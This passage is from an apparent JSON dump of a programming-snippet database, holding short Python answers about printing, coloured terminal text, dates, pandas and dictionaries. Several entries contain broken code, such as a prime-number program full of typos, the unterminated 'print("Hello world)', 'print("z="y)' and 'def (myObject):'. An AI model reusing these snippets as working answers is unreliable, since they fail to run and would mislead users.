    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2852,
    "keyword": null,
    "link": null,
    "title": " print(DATA.popitem())",
    "description": "what is pop.item()\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2853,
    "keyword": null,
    "link": null,
    "title": " print ()",
    "description": "print(\"Hello World!\")\n# This is a print statement print(\"Hello, world!\")\nprint(\"this is the print function!\")\na = 5 print('The value of a is', a)\nprint(\"Hello, World!\")\nprint(\"MOHAMMAD SHAWAKHA\")\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2854,
    "keyword": null,
    "link": null,
    "title": " print all attributes of object python",
    "description": "# use dir method  import random  print(dir(random))  ['BPF', 'LOG4', 'NV_MAGICCONST', 'RECIP_BPF', 'Random', 'SG_MAGICCONST', 'SystemRandom', 'TWOPI', '_BuiltinMethodType', '_MethodType', '_Sequence', '_Set', '__all__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_acos', '_ceil', '_cos', '_e', '_exp', '_inst', '_log', '_pi', '_random', '_sha512', '_sin', '_sqrt', '_test', '_test_generator', '_urandom', '_warn', 'betavariate', 'choice', 'expovariate', 'gammavariate', 'gauss', 'getrandbits', 'getstate', 'lognormvariate', 'normalvariate', 'paretovariate', 'randint', 'random', 'randrange', 'sample', 'seed', 'setstate', 'shuffle', 'triangular', 'uniform', 'vonmisesvariate', 'weibullvariate']  It will return a list  where you can find attribute ;  Example : we can use random.choice(list) , choice  is in list so we can    \t\tuse it with random .    \nprint(dir(your_variable))\ndef (myObject):   print(vars(myObject))\ngetattr(object, 'attribute_name')\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2855,
    "keyword": null,
    "link": null,
    "title": " print all keys having same value",
    "description": "dict = {\"Jim\": \"y\", \"Bob\": \"y\", \"Ravioli\": \"n\"} In [26]: [k for k,v in dict1.items() if v == 'y'] Out[26]: ['Bob', 'Jim']\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2856,
    "keyword": null,
    "link": null,
    "title": " print all of dataframe",
    "description": "print(df.to_string()) \nwith pd.option_context('display.max_rows', None, 'display.max_columns', None):  # more options can be specified also     print(df)\n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2857,
    "keyword": null,
    "link": null,
    "title": " print bold python",
    "description": "print('\\033[1m' + 'Text' + '\\033[0m')\nfrom simple_colors import * print(green('hello', 'bold'))\nfrom __future__ import unicode_literals, print_function from prompt_toolkit import print_formatted_text, HTML  print_formatted_text(HTML('<b>This is bold</b>')) print_formatted_text(HTML('<i>This is italic</i>')) print_formatted_text(HTML('<u>This is underlined</u>')) \n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2858,
    "keyword": null,
    "link": null,
    "title": " print colored text python",
    "description": "def colored(r, g, b, text):     return \"\\033[38;2;{};{};{}m{} \\033[38;2;255;255;255m\".format(r, g, b, text)    text = 'Hello, World' colored_text = colored(255, 0, 0, text) print(colored_text)  #or  print(colored(255, 0, 0, 'Hello, World'))\nclass bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m'  print(f\"{bcolors.WARNING}Error : Test message !{bcolors.ENDC}\")\nclass bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKCYAN = '\\033[96m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m'  print(f\"{bcolors.WARNING}Warning: No active frommets remain. Continue?{bcolors.ENDC}\")\n#pip install termcolor from termcolor import cprint  cprint('Hello, World! In yellow highlighted in red!', 'yellow', 'on_red') cprint('Hello, World! Underlined in red!', 'red', attrs=[\"underline\"])\n# Python program to print  # green text with red background   #pip install termcolor #pip install colorama    from colorama import init  from termcolor import colored     init()     print(colored('Hello, World!', 'green', 'on_red')) \nclass bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKCYAN = '\\033[96m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m' \n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2859,
    "keyword": null,
    "link": null,
    "title": " print colored text python on terminal",
    "description": "import colorama from colorama import Fore, Back, Style colorama.init(autoreset=True)  print('\\033[31m' + 'some red text') print('\\033[39m')  # and reset to default color print() print(f\"{Fore.RED}C{Fore.GREEN}O{Fore.YELLOW}L{Fore.BLUE}O{Fore.MAGENTA}R{Fore.CYAN}S{Fore.WHITE}!\") print(f\"{Fore.RED}Red Text\") print(f\"{Fore.GREEN}Green Text\") print(f\"{Fore.YELLOW}Yellow Text\") print(f\"{Fore.BLUE}Blue Text\") print(f\"{Fore.MAGENTA}Magenta Text\") print(f\"{Fore.CYAN}Cyan Text\") print(f\"{Fore.WHITE}White Text\") print() print(f\"{Back.RED}B{Back.GREEN}A{Back.YELLOW}C{Back.BLUE}K{Back.MAGENTA}G{Back.CYAN}R{Back.WHITE}O{Back.RED}U{Back.GREEN}N{Back.YELLOW}D{Back.BLUE}!\") print(f\"{Back.RED}Red Background\") print(f\"{Back.GREEN}Green Background\") print(f\"{Back.YELLOW}Yellow Background\") print(f\"{Back.BLUE}Blue Background\") print(f\"{Back.MAGENTA}Magenta Background\") print(f\"{Back.CYAN}Cyan Background\") print(f\"{Back.WHITE}White Background\") print() print(f\"{Style.DIM}S{Style.NORMAL}T{Style.BRIGHT}Y{Style.DIM}L{Style.NORMAL}E{Style.BRIGHT}!\") print(f\"{Style.DIM}Dim Text\") print(f\"{Style.NORMAL}Normal Text\") print(f\"{Style.BRIGHT}Bright Text\") print() print(f\"{Fore.YELLOW}{Back.RED}C{Back.GREEN}{Fore.RED}O{Back.YELLOW}{Fore.BLUE}M{Back.BLUE}{Fore.BLACK}B{Back.MAGENTA}{Fore.CYAN}I{Back.CYAN}{Fore.GREEN}N{Back.WHITE}A{Back.RED}T{Back.GREEN}I{Back.YELLOW}O{Back.BLUE}N\") print(f\"{Fore.GREEN}{Back.YELLOW}{Style.BRIGHT}Green Text - Yellow Background - Bright\") print(f\"{Fore.CYAN}{Back.WHITE}{Style.DIM}Cyan Text - White Background - Dim\")   ''' Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. Style: DIM, NORMAL, BRIGHT, RESET_ALL '''\ndef colored(r, g, b, text):     return \"\\033[38;2;{};{};{}m{} \\033[38;2;255;255;255m\".format(r, g, b, text)    text = 'Hello, World' colored_text = colored(255, 0, 0, text) print(colored_text)  #or  print(colored(255, 0, 0, 'Hello, World'))\nclass colors:     '''Colors class:     reset all colors with colors.reset     two subclasses fg for foreground and bg for background.     use as colors.subclass.colorname.     i.e. colors.fg.red or colors.bg.green     also, the generic bold, disable, underline, reverse, strikethrough,     and invisible work with the main class     i.e. colors.bold     '''     reset='\\033[0m'     bold='\\033[01m'     disable='\\033[02m'     underline='\\033[04m'     reverse='\\033[07m'     strikethrough='\\033[09m'     invisible='\\033[08m'     class fg:         black='\\033[30m'         red='\\033[31m'         green='\\033[32m'         orange='\\033[33m'         blue='\\033[34m'         purple='\\033[35m'         cyan='\\033[36m'         lightgrey='\\033[37m'         darkgrey='\\033[90m'         lightred='\\033[91m'         lightgreen='\\033[92m'         yellow='\\033[93m'         lightblue='\\033[94m'         pink='\\033[95m'         lightcyan='\\033[96m'     class bg:         black='\\033[40m'         red='\\033[41m'         green='\\033[42m'         orange='\\033[43m'         blue='\\033[44m'         purple='\\033[45m'         cyan='\\033[46m'         lightgrey='\\033[47m' \n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2860,
    "keyword": null,
    "link": null,
    "title": " print column in 2d numpy array",
    "description": "import numpy as np x=np.arange(25).reshape(5,5) print(x) #print(x[:,index_of_column_you_need]) print(x[:,3])\n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2861,
    "keyword": null,
    "link": null,
    "title": " print complete dataframe pandas",
    "description": "with pd.option_context('display.max_rows', None, 'display.max_columns', None):  # more options can be specified also     print(df) \n#pretty print in jupyter-notebook pd.set_option('display.max_rows', None) pd.set_option('display.max_columns', None) data\npd.set_option(\"display.max_rows\", None, \"display.max_columns\", None)\n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2862,
    "keyword": null,
    "link": null,
    "title": " print console sys.stdout",
    "description": "sys.stdout = open(\"test.txt\", \"w\")  print(\"Hello World\")  sys.stdout.close() # TEST.TXT: # Hello World\n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2863,
    "keyword": null,
    "link": null,
    "title": " print current date",
    "description": "from datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nfrom datetime import date  today = date.today() print(\"Today's date:\", today) \n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2864,
    "keyword": null,
    "link": null,
    "title": " print current date and time in python",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\n# Example usage: import datetime date_time = datetime.datetime.now() print(date_time) --> 2020-10-03 15:29:54.822751  # From the date_time variable, you can extract the date in various # custom formats with .strftime(), for example: date_time.strftime(\"%d/%m/%Y\") --> '03/10/2020' # dd/mm/yyyy  date_time.strftime(\"%m/%d/%y\") --> '10/03/20' # mm/dd/yy  date_time.strftime(\"%Y/%m/%d\") --> '2020/10/03'  date_time.strftime(\"%Y-%m-%d\") --> '2020-10-03'  date_time.strftime(\"%B %d, %Y\") --> 'October 03, 2020'  # Key for other custom date/time formats: Directive\tDescription\t\t\t\t\t\t\t\tExample %a\t\t\tWeekday, short version\t\t\t\t\tWed\t %A\t\t\tWeekday, full version\t\t\t\t\tWednesday\t %w\t\t\tWeekday as a number 0-6, 0 is Sunday\t3\t %d\t\t\tDay of month 01-31\t\t\t\t\t\t31\t %b\t\t\tMonth name, short version\t\t\t\tDec\t %B\t\t\tMonth name, full version\t\t\t\tDecember\t %m\t\t\tMonth as a number 01-12\t\t\t\t\t12\t %y\t\t\tYear, short version, without century\t18\t %Y\t\t\tYear, full version\t\t\t\t\t\t2018\t %H\t\t\tHour 00-23\t\t\t\t\t\t\t\t17\t %I\t\t\tHour 00-12\t\t\t\t\t\t\t\t05\t %p\t\t\tAM/PM\t\t\t\t\t\t\t\t\tPM\t %M\t\t\tMinute 00-59\t\t\t\t\t\t\t41\t %S\t\t\tSecond 00-59\t\t\t\t\t\t\t08\t %f\t\t\tMicrosecond 000000-999999\t\t\t\t548513\t %z\t\t\tUTC offset\t\t\t\t\t\t\t\t+0100\t %Z\t\t\tTimezone\t\t\t\t\t\t\t\tCST\t %j\t\t\tDay number of year 001-366\t\t\t\t365\t %U\t\t\tWeek number of year 00-53\t\t\t\t52\t %c\t\t\tLocal version of date and time\t\t\tMon Dec 31 17:41:00 2018\t %x\t\t\tLocal version of date\t\t\t\t\t12/31/18\t %X\t\t\tLocal version of time\t\t\t\t\t17:41:00\t %%\t\t\tA % character\t\t\t\t\t\t\t%\nfrom datetime import datetime now = datetime.now() print(\"date and time now: \", now)  #you can also personalize how the formats, example: dt = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time now: \", dt)  #the output will be #date and time now:  22/12/2020 01:19:32\ncurrent_date = datetime.date.today()\n",
    "reg_date": "2021-10-12T11:32:29.000Z"
  },
  {
    "id": 2865,
    "keyword": null,
    "link": null,
    "title": " print every element in list python outside string",
    "description": "print(\"\".join(list/dict) #\"\" is the character printed between the list elements\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2866,
    "keyword": null,
    "link": null,
    "title": " print first dictionary keys python",
    "description": "first_key = list(my_dict.keys())[0] print(first_key)\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2867,
    "keyword": null,
    "link": null,
    "title": " print first word of a string python and return it",
    "description": "def print_first_word():     words = \"All good things come to those who wait\"     print(words.split().pop(0))     #to print the last word use pop(-1) print_first_word()\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2868,
    "keyword": null,
    "link": null,
    "title": " print fortnite python",
    "description": "print(\"fortnite\") #why?\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2869,
    "keyword": null,
    "link": null,
    "title": " print function python",
    "description": "print(\"Hello World!\")\nprint(\"Hello World\")\n# This is a print statement print(\"Hello, world!\")\nprint('Hello, world!')\nprint('datacamp','tutorial','on','python','print','function',sep='\\n') #`\\n` will put each word in a new line \ndatacamp tutorial on python print function \n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2870,
    "keyword": null,
    "link": null,
    "title": " print hello world",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2871,
    "keyword": null,
    "link": null,
    "title": " print hello world in swift",
    "description": "print(\"Hello World\")\n// Swift \"Hello, World!\" Program  print(\"Hello, World!\") \n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2872,
    "keyword": null,
    "link": null,
    "title": " print in phython",
    "description": "print(\"Hello World!\")\nprint(\"Hello World\")\n#try it :) print(\"Hello, world!\")  #or   #you can print variable name = \"Harry\" print(name)   name = \"Harry\";print(name) #all on the same line \nstring_to_print = \"Hello World\" print(string_to_print)\nx=str(\"Hello \") y=str(\"world \") print(x+y) print(y+x) z=int(40) print(\"z=\"y)\nprint(\"Hello world)\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2873,
    "keyword": null,
    "link": null,
    "title": " print in python",
    "description": "print(\"Hello World\")\nprint(\"Hey! How are you doing?\")  ## formatted string literal answer = \"Well!\" print(f\"Hey! How are you doing? {answer}\")\n# Simple Print: print(\"Hello World!\")  # Formatting message in python3.6- : name = \"World\" print(\"Hello {}!\".format(name))  # Formatting message in python3.7+ : name = \"World\" print(f\"Hello {name}!\")\n#('') a string, to indicate it is a string you can use (\"\") or ('') print(\"hello world\") #a integer  print(19) # a float: print(4.5) # a bool: print (True) print (False)\n# the print commmand will write anything in your out put box print(\"hello world\")\nwords = 'Hello', 'World', 'Python', 'makes', 'life', 'easier' print(*words, sep='\\n')\nprint(\"wathever you want!\")\nprint(\"Text\")    # Prints Text a = 54 print(a)   # Prints 54\na = 5 print('The value of a is', a)\ndef i_will_print_with_a_diffrent_function(x):   print(x) i_will_print_with_a_diffrent_function(\"my name\")\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2874,
    "keyword": null,
    "link": null,
    "title": " print items in object python",
    "description": "def (myObject):   print(vars(myObject))\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2875,
    "keyword": null,
    "link": null,
    "title": " print json python",
    "description": "import json  uglyjson = '{\"firstnam\":\"James\",\"surname\":\"Bond\",\"mobile\":[\"007-700-007\",\"001-007-007-0007\"]}'  #json.load method converts JSON string to Python Object parsed = json.loads(uglyjson)  print(json.dumps(parsed, indent=2, sort_keys=True))\n# This is a print statement print(\"Hello, world!\")\n# Python program to read  # json file        import json     # Opening JSON file  f = open('data.json',)     # returns JSON object as   # a dictionary  data = json.load(f)     # Iterating through the json  # list  for i in data['emp_details']:      print(i)     # Closing file  f.close()  \nimport json  json.dumps(['foo', {'bar': ('baz', None, 1.0, 2)}]) '[\"foo\", {\"bar\": [\"baz\", null, 1.0, 2]}]'  print(json.dumps({\"c\": 0, \"b\": 0, \"a\": 0}, sort_keys=True)) {\"a\": 0, \"b\": 0, \"c\": 0} \n import json  with open('path_to_file/person.json') as f:   data = json.load(f)  # Output: {'name': 'Bob', 'languages': ['English', 'Fench']} print(data) \nprint(\"Hello, World!\") #Output: Hello, World!  print(5+5) # Output:10  x=10 y=11 print(x+y) #Output: 21\n",
    "reg_date": "2021-10-12T11:32:30.000Z"
  },
  {
    "id": 2876,
    "keyword": null,
    "link": null,
    "title": " print key of dictionary python",
    "description": "for key, value in mydic.items() :     print (key, value)\nprint(dictionary.items()) #prints keys and values print(dictionary.keys()) #prints keys print(dictionary.values()) #prints values\n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2877,
    "keyword": null,
    "link": null,
    "title": " print list vertically in python with loop",
    "description": "# using * operator and sep = '\\n' scores = [11, 12, 13, 14, 15, 16] print(*scores, sep = '\\n')\n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2878,
    "keyword": null,
    "link": null,
    "title": " print matrix eleme",
    "description": "#Exemple: M=[[1,2,3],[4,5,6],[7,8,9]] #Converting Matrix elements to string (join() only work with str Matrix) M=list(map(lambda i:[str(_) for _ in i],M)) [print(' '.join(i)) for i in M] \n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2879,
    "keyword": null,
    "link": null,
    "title": " print pandas version",
    "description": "import pandas as pd  print(pd.__version__) # 0.22.0 \nprint(pandas.__version__)\nimport pandas as pd pd.__version__\n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2880,
    "keyword": null,
    "link": null,
    "title": " print python",
    "description": "print('Hello, world!')\n#try it :) print(\"Hello, world!\")  #or   #you can print variable name = \"Harry\" print(name)   name = \"Harry\";print(name) #all on the same line \nprint('Hello, world!')  # Oh, I'm late...\n# Simple Print: print(\"Hello World!\")  # Formatting message in python3.6- : name = \"World\" print(\"Hello {}!\".format(name))  # Formatting message in python3.7+ : name = \"World\" print(f\"Hello {name}!\")\nx=str(\"Hello \") y=str(\"world \") print(x+y) print(y+x) z=int(40) print(\"z=\"y)\n#this is how to print print(\"I am getting printed\")\n#FR str_one = \"Hello, \" str_two = \"world !\"  print(str_one + str_two)\n# You can use ' or \"  # Print a text string in JavaScript print('My text')  # Print a variable in JavaScript my_variable = str('Text') print(my_variable)  # Print a number in JavaScript print(123)\nprint('hello world') #print can write a string a number or a variable  #for example you can 'print' a number print(1) #if you want to print a number you can print it without '' or \"\"  #we can print a variable string = 'hi' print(string) #if you want to print a variable you can print it without '' or \"\"\n#making a print statement: print('your text') # you should now see'your text' in the terminal\n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2881,
    "keyword": null,
    "link": null,
    "title": " print random string from list python",
    "description": "import random  list = [\"Item 1\", \"Item 2\", \"Item 3\"]\t\t\t# List item = random.choice(list)\t\t\t\t\t\t# Chooses from list print(item)\t\t\t\t\t# Prints choice  # From stackoverflow # Tried and tested method\nimport random  foo = ['a', 'b', 'c', 'd', 'e'] print(random.choice(foo))\nrandom.choice(name of list)\nimport random #dictionary x_dict = {30:60, 20:40,10:20} key = random.choice(list(x_dict)) print (key)#if you want it to print 30, 20, or 10 print (x_dict[key])#if you want it to print 60, 40, or 20 print (key,\"-\", x_dict[key])# if you want to print 30 - 60, 20-40,or 10-20\nimport random  # with replacement = same item CAN be chosen more than once. # without replacement = same item CANNOT be chosen more then once.  # Randomly select 2 elements from list without replacement and return a list random.sample(list_name, 2)  # Randomly select 3 elements from list with replacement and return a list random.choices(set_name, k=3)  # Returns 1 random element from list random.choice(list_name)\n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2882,
    "keyword": null,
    "link": null,
    "title": " print red in python",
    "description": "import os  # System call os.system(\"\")  # Class of different styles class style():     BLACK = '\\033[30m'     RED = '\\033[31m'     GREEN = '\\033[32m'     YELLOW = '\\033[33m'     BLUE = '\\033[34m'     MAGENTA = '\\033[35m'     CYAN = '\\033[36m'     WHITE = '\\033[37m'     UNDERLINE = '\\033[4m'     RESET = '\\033[0m'  print(style.YELLOW + \"Hello, World!\") \n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2883,
    "keyword": null,
    "link": null,
    "title": " print specific part in bold or colours and end.",
    "description": "class color:    PURPLE = '\\033[95m'    CYAN = '\\033[96m'    DARKCYAN = '\\033[36m'    BLUE = '\\033[94m'    GREEN = '\\033[92m'    YELLOW = '\\033[93m'    RED = '\\033[91m'    BOLD = '\\033[1m'    UNDERLINE = '\\033[4m'    END = '\\033[0m'  print(color.BOLD + 'Hello World !' + color.END) \n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2884,
    "keyword": null,
    "link": null,
    "title": " print surrent directory python",
    "description": "import os cwd = os.getcwd()\n",
    "reg_date": "2021-10-12T11:32:31.000Z"
  },
  {
    "id": 2885,
    "keyword": null,
    "link": null,
    "title": " print textbox value in tkinter",
    "description": "import tkinter as tk root = tk.Tk() root.geometry(\"400x240\")  def getTextInput():     result=textExample.get(\"1.0\",\"end\")     print(result)  textExample=tk.Text(root, height=10) textExample.pack() btnRead=tk.Button(root, height=1, width=10, text=\"Read\",                      command=getTextInput)  btnRead.pack()  root.mainloop()\nresult=textExample.get(\"1.0\",\"end\") print(result)\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2886,
    "keyword": null,
    "link": null,
    "title": " print the Prime One Digit Difference numbers in python",
    "description": "#Program to find the One Digit Difference Prime NUmbers between 0 - 10Mil #function to find given number is prime or not #num -> number type only accepts single number #it returns true if its prime else returns false if its not prime. def primeornot(num):     for i in range(2,(num//2)+1):         if(num%i==0):             return False     return True  #function to find the given number is one digit difference or not #number -> Number type only accepts single number #it returns True if number is ODD number else returns False if its not an ODD number def oddornot(number):     number = str(number)     c = 0     for n in range(0, len(number)-1):         if(int(number[n]) - int(number[n+1]) == -1 or int(nyumber[n+1]) ==1):             c += 1             if(c == len(number)-1):L             return True     return False  #Driver Code user_input = float(input(\"Please int the range: \")) #user Input if you give a float number we will convert into an integer if(user_input>0):     user_input = int(user_input) #converting any number to integer else:     print(\"Only Numbers greater than 0 are allowed\") for j in range(0, user_input):     if(primenot(j)):         if(oddornot(j)):             print(j)\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2887,
    "keyword": null,
    "link": null,
    "title": " print the heat map python",
    "description": "import numpy as np import seaborn as sns import matplotlib.pylab as plt  uniform_data = np.random.rand(10, 12) ax = sns.heatmap(uniform_data, linewidth=0.5) plt.show()\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2888,
    "keyword": null,
    "link": null,
    "title": " print time in python",
    "description": "from datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nimport datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\nimport datetime now = datetime.datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) # key: https://strftime.org/\n from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \nimport datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \n import time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2889,
    "keyword": null,
    "link": null,
    "title": " print time python",
    "description": "import datetime now = datetime.datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) # key: https://strftime.org/\n from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \nimport datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \n from datetime import datetime  now = datetime.now().time() # time object  print(\"now =\", now) print(\"type(now) =\", type(now))\t\n import time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \nimport datetime datetime.datetime.now() datetime.datetime(2009, 1, 6, 15, 8, 24, 78915)  print(datetime.datetime.now()) #2009-01-06 15:08:24.789150\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2890,
    "keyword": null,
    "link": null,
    "title": " print type of exception python",
    "description": "except Exception as e: print(e)\ntry:     someFunction() except Exception as ex:     template = \"An exception of type {0} occurred. Arguments:\\n{1!r}\"     message = template.format(type(ex).__name__, ex.args)     print (message)\n>>> try: ...     raise Exception('spam', 'eggs') ... except Exception as inst: ...     print(type(inst))    # the exception instance ...     print(inst.args)     # arguments stored in .args ...     print(inst)          # __str__ allows args to be printed directly, ...                          # but may be overridden in exception subclasses ...     x, y = inst.args     # unpack args ...     print('x =', x) ...     print('y =', y) ... <class 'Exception'> ('spam', 'eggs') ('spam', 'eggs') x = spam y = eggs \n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2891,
    "keyword": null,
    "link": null,
    "title": " print upto 1 decimal place python",
    "description": "print(\"{:.1f}\".format(number)) # Python3 print \"%.1f\" % number          # Python2\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2892,
    "keyword": null,
    "link": null,
    "title": " print url selenium python",
    "description": "print(driver.current_url)\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2893,
    "keyword": null,
    "link": null,
    "title": " print variable type python",
    "description": "v = 10 type(v) # <type 'int'>\nstr = \"Hello\" type(str)\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2894,
    "keyword": null,
    "link": null,
    "title": " print whole dataframe python",
    "description": "with pd.option_context('display.max_rows', None, 'display.max_columns', None):  # more options can be specified also     print(df) \npd.set_option(\"display.max_rows\", None, \"display.max_columns\", None)\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2895,
    "keyword": null,
    "link": null,
    "title": " printing python dictionary values",
    "description": "#print keys and values from the dictionary  for k, v in dic.items():   print(k, v)\n",
    "reg_date": "2021-10-12T11:32:32.000Z"
  },
  {
    "id": 2896,
    "keyword": null,
    "link": null,
    "title": " printing with colors",
    "description": "CEND      = '\\33[0m' CBOLD     = '\\33[1m' CITALIC   = '\\33[3m' CURL      = '\\33[4m' CBLINK    = '\\33[5m' CBLINK2   = '\\33[6m' CSELECTED = '\\33[7m'  CBLACK  = '\\33[30m' CRED    = '\\33[31m' CGREEN  = '\\33[32m' CYELLOW = '\\33[33m' CBLUE   = '\\33[34m' CVIOLET = '\\33[35m' CBEIGE  = '\\33[36m' CWHITE  = '\\33[37m'  CBLACKBG  = '\\33[40m' CREDBG    = '\\33[41m' CGREENBG  = '\\33[42m' CYELLOWBG = '\\33[43m' CBLUEBG   = '\\33[44m' CVIOLETBG = '\\33[45m' CBEIGEBG  = '\\33[46m' CWHITEBG  = '\\33[47m'  CGREY    = '\\33[90m' CRED2    = '\\33[91m' CGREEN2  = '\\33[92m' CYELLOW2 = '\\33[93m' CBLUE2   = '\\33[94m' CVIOLET2 = '\\33[95m' CBEIGE2  = '\\33[96m' CWHITE2  = '\\33[97m'  CGREYBG    = '\\33[100m' CREDBG2    = '\\33[101m' CGREENBG2  = '\\33[102m' CYELLOWBG2 = '\\33[103m' CBLUEBG2   = '\\33[104m' CVIOLETBG2 = '\\33[105m' CBEIGEBG2  = '\\33[106m' CWHITEBG2  = '\\33[107m'  #example: print(CRED2, \"This will be typed in red\", CEND)\n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2897,
    "keyword": null,
    "link": null,
    "title": " printing with format float to 2 decimal places python",
    "description": "formatted_float = \"{:.2f}\".format(a_float)\n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2898,
    "keyword": null,
    "link": null,
    "title": " printpython",
    "description": "print(\"Hello World!\")\n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2899,
    "keyword": null,
    "link": null,
    "title": " priting matrix using np truncating the output",
    "description": "import sys import numpy numpy.set_printoptions(threshold=sys.maxsize) \nimport numpy as np np.set_printoptions(threshold=np.inf) \n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2900,
    "keyword": null,
    "link": null,
    "title": " program to find even numbers in python",
    "description": "m = int(input(\"Enter number\")) if m % 2 == 0:     print(m,\"is an even number\") else:     print(m,\"is an odd number\")      \n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2901,
    "keyword": null,
    "link": null,
    "title": " program to find the largest of three numbers in python",
